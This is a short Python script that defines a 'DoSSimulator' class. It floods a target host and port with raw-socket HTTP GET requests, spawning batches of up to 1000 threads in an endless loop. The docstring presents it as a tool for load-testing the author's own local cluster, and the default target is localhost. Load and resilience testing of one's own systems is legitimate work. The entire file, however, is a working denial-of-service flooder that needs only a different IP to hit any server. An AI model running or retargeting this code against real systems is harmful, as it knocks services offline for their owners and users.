import threading
import socket

class DoSSimulator():
    """
    Class to simulate a DoS attack on my local cluster.

    Please note that this is a simple script used for the purpose of testing a DoS attack on my local cluster. 
    Do not use this script for any other purpose than on your own cluster.

    """
    def __init__(self, target_ip: str, target_port: int, n_threads: int = 500):
        """
        Initialize the DoS simulator.

        Args:
            target_ip (str): The IP address of the target.
            target_port (int): The port of the target.
            n_threads (int): The number of threads to use for the attack.

        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.n_threads = n_threads

    def make_request_with_socket(self):
        """
        Make a request with a socket.

        Please note that I have tried making a request using requests package but it was not working. 
        This is why I am using a raw socket to make the request to allow the connection to be established and remain 
        open whilst the script is running.

        """
        try:
            print("\nTrying with raw socket...")            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((self.target_ip, self.target_port))
            
            request = (
                f"GET / HTTP/1.1\r\n"
                f"Host: localhost:{self.target_port}\r\n"
                f"User-Agent: curl/7.68.0\r\n"
                f"Accept: */*\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            )

            s.send(request.encode())
            response = s.recv(1024)
            print(f"Socket Response: {response.decode()}")
            s.close()
        except Exception as e:
            print(f"Socket error: {e}")

  
    def run(self):       
        """
        Run the DoS simulator.

        This method will run the DoS simulator in an infinite loop
        whilst initialising a new thread for each request. 
        
        """
        while True:
            for _ in range(self.n_threads):
                process = threading.Thread(target=self.make_request_with_socket)
                process.start()            

if __name__ == "__main__":
    target_ip = "localhost"
    target_port = 30000
    ds = DoSSimulator(target_ip=target_ip, target_port=target_port, n_threads=1000)
    ds.run()
